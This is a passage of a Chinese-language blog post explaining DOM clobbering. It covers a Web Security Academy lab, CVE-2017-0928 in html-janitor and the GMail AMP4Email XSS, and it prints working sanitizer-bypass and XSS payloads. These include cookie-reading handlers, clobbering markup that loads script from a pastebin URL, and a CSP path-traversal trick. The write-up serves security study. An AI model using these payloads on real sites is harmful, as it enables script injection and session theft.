<h6 id="payload如下："><a href="#payload如下：" class="headerlink" title="payload如下："></a>payload如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">attributes</span>&gt;</span>Click me</span><br></pre></td></tr></table></figure>

<h6 id="由于attributes被覆盖导致执行到payload的form时跳过for循环跳过黑名单，成功执行xss。"><a href="#由于attributes被覆盖导致执行到payload的form时跳过for循环跳过黑名单，成功执行xss。" class="headerlink" title="由于attributes被覆盖导致执行到payload的form时跳过for循环跳过黑名单，成功执行xss。"></a>由于<code>attributes</code>被覆盖导致执行到payload的<code>form</code>时跳过<code>for</code>循环跳过黑名单，成功执行xss。</h6><h6 id="跟上面一样我们先看看loadCommentsWithHtmlJanitor-js的代码。"><a href="#跟上面一样我们先看看loadCommentsWithHtmlJanitor-js的代码。" class="headerlink" title="跟上面一样我们先看看loadCommentsWithHtmlJanitor.js的代码。"></a>跟上面一样我们先看看<a href="https://ac881f5f1f7c651280861b7b00860012.web-security-academy.net/resources/js/loadCommentsWithHtmlJanitor.js" target="_blank" rel="noopener">loadCommentsWithHtmlJanitor.js</a>的代码。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sanitize attributes</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; a &lt; node.attributes.length; a += <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> attr = node.attributes[a];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (shouldRejectAttr(attr, allowedAttrs, node)) &#123;</span><br><span class="line">        node.removeAttribute(attr.name);</span><br><span class="line">        <span class="comment">// Shift the array to continue looping.</span></span><br><span class="line">        a = a - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="在这里最终对标签的属性进行了检查，对每个node的属性都进行了白名单检查："><a href="#在这里最终对标签的属性进行了检查，对每个node的属性都进行了白名单检查：" class="headerlink" title="在这里最终对标签的属性进行了检查，对每个node的属性都进行了白名单检查："></a>在这里最终对标签的属性进行了检查，对每个node的属性都进行了白名单检查：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shouldRejectAttr</span>(<span class="params">attr, allowedAttrs, node</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> attrName = attr.name.toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (allowedAttrs === <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> allowedAttrs[attrName] === <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> !allowedAttrs[attrName](attr.value, node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> allowedAttrs[attrName] === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (allowedAttrs[attrName] === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> allowedAttrs[attrName] === <span class="string">"string"</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> allowedAttrs[attrName] !== attr.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="但是上面有个很危险的行为使用了node-attributes-length，如果我们通过覆盖attributes会发生上面呢？"><a href="#但是上面有个很危险的行为使用了node-attributes-length，如果我们通过覆盖attributes会发生上面呢？" class="headerlink" title="但是上面有个很危险的行为使用了node.attributes.length，如果我们通过覆盖attributes会发生上面呢？"></a>但是上面有个很危险的行为使用了<code>node.attributes.length</code>，如果我们通过覆盖<code>attributes</code>会发生上面呢？</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> node = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; node.attributes.length; a++) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="上面的代码会输出一个NamedNodeMap对象，id-39-x-39-。"><a href="#上面的代码会输出一个NamedNodeMap对象，id-39-x-39-。" class="headerlink" title="上面的代码会输出一个NamedNodeMap对象，id=&#39;x&#39;。"></a>上面的代码会输出一个<code>NamedNodeMap</code>对象，<code>id=&#39;x&#39;</code>。</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> node = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; node.attributes.length; a++) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="上面这段代码会输出-lt-img-name-attributes-gt-，成功的覆盖了原来的node-attributes，导致跳出了for循环。"><a href="#上面这段代码会输出-lt-img-name-attributes-gt-，成功的覆盖了原来的node-attributes，导致跳出了for循环。" class="headerlink" title="上面这段代码会输出&lt;img name=attributes&gt;，成功的覆盖了原来的node.attributes，导致跳出了for循环。"></a>上面这段代码会输出<code>&lt;img name=attributes&gt;</code>，成功的覆盖了原来的<code>node.attributes</code>，导致跳出了<code>for</code>循环。</h6><h6 id="结合上面的例子我们可以通过构造-lt-form-id-x-gt-lt-input-id-attributes-gt-的形式来绕过。"><a href="#结合上面的例子我们可以通过构造-lt-form-id-x-gt-lt-input-id-attributes-gt-的形式来绕过。" class="headerlink" title="结合上面的例子我们可以通过构造&lt;form id=x&gt;&lt;input id=attributes&gt;的形式来绕过。"></a>结合上面的例子我们可以通过构造<code>&lt;form id=x&gt;&lt;input id=attributes&gt;</code>的形式来绕过。</h6><h6 id="根据题目的要求，需要访问触发，并且通过参考资料得知利用tabindex属性和form的onfocus来执行xss。"><a href="#根据题目的要求，需要访问触发，并且通过参考资料得知利用tabindex属性和form的onfocus来执行xss。" class="headerlink" title="根据题目的要求，需要访问触发，并且通过参考资料得知利用tabindex属性和form的onfocus来执行xss。"></a>根据题目的要求，需要访问触发，并且通过参考资料得知利用<code>tabindex</code>属性和<code>form</code>的<code>onfocus</code>来执行xss。</h6><h6 id="因此构造如下："><a href="#因此构造如下：" class="headerlink" title="因此构造如下："></a>因此构造如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">0</span> <span class="attr">onfocus</span>=<span class="string">alert(document.cookie)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">attributes</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-5.PNG" alt></p>
<h6 id="但是我们要解决这个lab需要提交到该漏洞利用的漏洞实验室，而且用户直接点击是不会触发xss的，因此我们要构造一个在评论后主动访问并且加上-x，为了等待评论完成我们需要延迟一下，因此构造下面的payload"><a href="#但是我们要解决这个lab需要提交到该漏洞利用的漏洞实验室，而且用户直接点击是不会触发xss的，因此我们要构造一个在评论后主动访问并且加上-x，为了等待评论完成我们需要延迟一下，因此构造下面的payload" class="headerlink" title="但是我们要解决这个lab需要提交到该漏洞利用的漏洞实验室，而且用户直接点击是不会触发xss的，因此我们要构造一个在评论后主动访问并且加上#x，为了等待评论完成我们需要延迟一下，因此构造下面的payload:"></a>但是我们要解决这个lab需要提交到该漏洞利用的漏洞实验室，而且用户直接点击是不会触发xss的，因此我们要构造一个在评论后主动访问并且加上<code>#x</code>，为了等待评论完成我们需要延迟一下，因此构造下面的payload:</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">https://ac5d1feb1e0464fb80aec03700a10012.web-security-academy.net/post?postId</span>=<span class="string">2</span> <span class="attr">onload</span>=<span class="string">"setTimeout(a=&gt;this.src=this.src+'#x',500)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="直接提交完成lab。"><a href="#直接提交完成lab。" class="headerlink" title="直接提交完成lab。"></a>直接提交完成lab。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-6.PNG" alt></p>
<h5 id="3-CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering"><a href="#3-CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering" class="headerlink" title="3.CVE-2017-0928 Bypassing sanitization using DOM clobbering"></a>3.CVE-2017-0928 Bypassing sanitization using DOM clobbering</h5><h6 id="html-janitor也就是我们上文用到的-HTML-filters，在-v2-0-2-当中，janitor-在循环中有这么几行代码："><a href="#html-janitor也就是我们上文用到的-HTML-filters，在-v2-0-2-当中，janitor-在循环中有这么几行代码：" class="headerlink" title="html-janitor也就是我们上文用到的 HTML filters，在 v2.0.2 当中，janitor 在循环中有这么几行代码："></a><a href="https://github.com/guardian/html-janitor/" target="_blank" rel="noopener">html-janitor</a>也就是我们上文用到的 HTML filters，在 v2.0.2 当中，janitor 在循环中有这么几行代码：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="comment">// Ignore nodes that have already been sanitized</span></span><br><span class="line">  <span class="keyword">if</span> (node._sanitized) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="comment">// Sanitize children</span></span><br><span class="line">  <span class="keyword">this</span>._sanitize(node);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Mark node as sanitized so it's ignored in future runs</span></span><br><span class="line">  node._sanitized = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> ((node = treeWalker.nextSibling()));</span><br></pre></td></tr></table></figure>

<h6 id="用-sanitized作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的-payload-绕过第一个-if-就可以绕过标准化过滤了。"><a href="#用-sanitized作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的-payload-绕过第一个-if-就可以绕过标准化过滤了。" class="headerlink" title="用_sanitized作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的 payload 绕过第一个 if 就可以绕过标准化过滤了。"></a>用<code>_sanitized</code>作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的 payload 绕过第一个 if 就可以绕过标准化过滤了。</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.domain)</span> <span class="attr">name</span>=<span class="string">_sanitized</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。"><a href="#修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。" class="headerlink" title="修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。"></a>修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。</h6><h5 id="4-XSS-in-GMail’s-AMP4Email-via-DOM-Clobbering"><a href="#4-XSS-in-GMail’s-AMP4Email-via-DOM-Clobbering" class="headerlink" title="4.XSS in GMail’s AMP4Email via DOM Clobbering"></a>4.XSS in GMail’s AMP4Email via DOM Clobbering</h5><h6 id="这是我们OWASP-Top-10提名的攻击实例，作者首先在控制台输入window进行fuzz。"><a href="#这是我们OWASP-Top-10提名的攻击实例，作者首先在控制台输入window进行fuzz。" class="headerlink" title="这是我们OWASP Top 10提名的攻击实例，作者首先在控制台输入window进行fuzz。"></a>这是我们<code>OWASP Top 10</code>提名的攻击实例，作者首先在控制台输入<code>window</code>进行fuzz。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-7.PNG" alt></p>
<h6 id="这里他首先利用了AMP，尝试插入-lt-a-id-AMP-gt-，但是这个AMP被禁止了。"><a href="#这里他首先利用了AMP，尝试插入-lt-a-id-AMP-gt-，但是这个AMP被禁止了。" class="headerlink" title="这里他首先利用了AMP，尝试插入&lt;a id=AMP&gt;，但是这个AMP被禁止了。"></a>这里他首先利用了<code>AMP</code>，尝试插入<code>&lt;a id=AMP&gt;</code>，但是这个<code>AMP</code>被禁止了。</h6><h6 id="接着找到下一个AMP-MODE，这个没有被禁止，反而让作者发现了这里加载失败的-URL-当中有一个undefined。"><a href="#接着找到下一个AMP-MODE，这个没有被禁止，反而让作者发现了这里加载失败的-URL-当中有一个undefined。" class="headerlink" title="接着找到下一个AMP_MODE，这个没有被禁止，反而让作者发现了这里加载失败的 URL 当中有一个undefined。"></a>接着找到下一个<code>AMP_MODE</code>，这个没有被禁止，反而让作者发现了这里加载失败的 URL 当中有一个<code>undefined</code>。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-8.PNG" alt></p>
<h6 id="该作者插入了-lt-a-id-AMP-MODE-gt-导致产生的undefined，主要产生这个问题的代码经作者简化后是这样的："><a href="#该作者插入了-lt-a-id-AMP-MODE-gt-导致产生的undefined，主要产生这个问题的代码经作者简化后是这样的：" class="headerlink" title="该作者插入了&lt;a id=AMP_MODE&gt;导致产生的undefined，主要产生这个问题的代码经作者简化后是这样的："></a>该作者插入了<code>&lt;a id=AMP_MODE&gt;</code>导致产生的<code>undefined</code>，主要产生这个问题的代码经作者简化后是这样的：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">window</span>.document.createElement(<span class="string">"script"</span>);</span><br><span class="line">script.async = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> loc;</span><br><span class="line"><span class="keyword">if</span> (AMP_MODE.test &amp;&amp; <span class="built_in">window</span>.testLocation) &#123;</span><br><span class="line">    loc = <span class="built_in">window</span>.testLocation</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    loc = <span class="built_in">window</span>.location;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (AMP_MODE.localDev) &#123;</span><br><span class="line">    loc = loc.protocol + <span class="string">"//"</span> + loc.host + <span class="string">"/dist"</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    loc = <span class="string">"https://cdn.ampproject.org"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="string">"/"</span> : <span class="string">""</span>;</span><br><span class="line">b.src = loc + <span class="string">"/rtv/"</span> + AMP_MODE.rtvVersion; + <span class="string">"/"</span> + singlePass + <span class="string">"v0/"</span> + pluginName + <span class="string">".js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></table></figure>

<h6 id="这段代码还可以在简化："><a href="#这段代码还可以在简化：" class="headerlink" title="这段代码还可以在简化："></a>这段代码还可以在简化：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">window</span>.document.createElement(<span class="string">"script"</span>);</span><br><span class="line">script.async = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">b.src = <span class="built_in">window</span>.testLocation.protocol + <span class="string">"//"</span> +</span><br><span class="line">        <span class="built_in">window</span>.testLocation.host + <span class="string">"/dist/rtv/"</span> +</span><br><span class="line">        AMP_MODE.rtvVersion; + <span class="string">"/"</span> +</span><br><span class="line">        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="string">"/"</span> : <span class="string">""</span>) +</span><br><span class="line">        <span class="string">"v0/"</span> + pluginName + <span class="string">".js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></table></figure>

<h6 id="所以我们可以用-Dom-Clobbering-来让它加载我们任意的-js-文件，直接劫持protocol到我们任意-URL，再利用-注释掉后面的即可。"><a href="#所以我们可以用-Dom-Clobbering-来让它加载我们任意的-js-文件，直接劫持protocol到我们任意-URL，再利用-注释掉后面的即可。" class="headerlink" title="所以我们可以用 Dom Clobbering 来让它加载我们任意的 js 文件，直接劫持protocol到我们任意 URL，再利用#注释掉后面的即可。"></a>所以我们可以用 Dom Clobbering 来让它加载我们任意的 js 文件，直接劫持<code>protocol</code>到我们任意 URL，再利用<code>#</code>注释掉后面的即可。</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"AMP_MODE"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"AMP_MODE"</span> <span class="attr">name</span>=<span class="string">"localDev"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"AMP_MODE"</span> <span class="attr">name</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"testLocation"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"testLocation"</span> <span class="attr">name</span>=<span class="string">"protocol"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">href</span>=<span class="string">"https://pastebin.com/raw/0tn8z0rG#"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="虽然-URL-构造出来了，但是-Google-还有-CSP"><a href="#虽然-URL-构造出来了，但是-Google-还有-CSP" class="headerlink" title="虽然 URL 构造出来了，但是 Google 还有 CSP"></a>虽然 URL 构造出来了，但是 Google 还有 CSP</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;;</span><br><span class="line">script-src &apos;sha512-oQwIl...==&apos;</span><br><span class="line">  https://cdn.ampproject.org/rtv/</span><br><span class="line">  https://cdn.ampproject.org/v0.js</span><br><span class="line">  https://cdn.ampproject.org/v0/</span><br></pre></td></tr></table></figure>

<h6 id="虽然他当时没绕过，但是-Google-还是全额地给了他奖金。"><a href="#虽然他当时没绕过，但是-Google-还是全额地给了他奖金。" class="headerlink" title="虽然他当时没绕过，但是 Google 还是全额地给了他奖金。"></a>虽然他当时没绕过，但是 Google 还是全额地给了他奖金。</h6><h6 id="不过后来有前辈经过研究可以通过-252f的trick进行绕过，其实就是利用url的目录穿梭绕过，例如："><a href="#不过后来有前辈经过研究可以通过-252f的trick进行绕过，其实就是利用url的目录穿梭绕过，例如：" class="headerlink" title="不过后来有前辈经过研究可以通过..%252f的trick进行绕过，其实就是利用url的目录穿梭绕过，例如："></a>不过后来有前辈经过研究可以通过<code>..%252f</code>的trick进行绕过，其实就是利用url的目录穿梭绕过，例如：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">Content-Security-Policy</span> <span class="attr">content</span>=<span class="string">"script-src pastebin.com/XYZ/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Clobbering Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- this will execute --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://pastebin.com/XYZ%2f..%2fraw/b0Rajxqk"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="0x07-学而不思则罔-思而不学则殆"><a href="#0x07-学而不思则罔-思而不学则殆" class="headerlink" title="0x07 学而不思则罔 思而不学则殆"></a>0x07 学而不思则罔 思而不学则殆</h4><h5 id="1-Document-amp-id"><a href="#1-Document-amp-id" class="headerlink" title="1.Document &amp; id"></a>1.<code>Document &amp; id</code></h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span 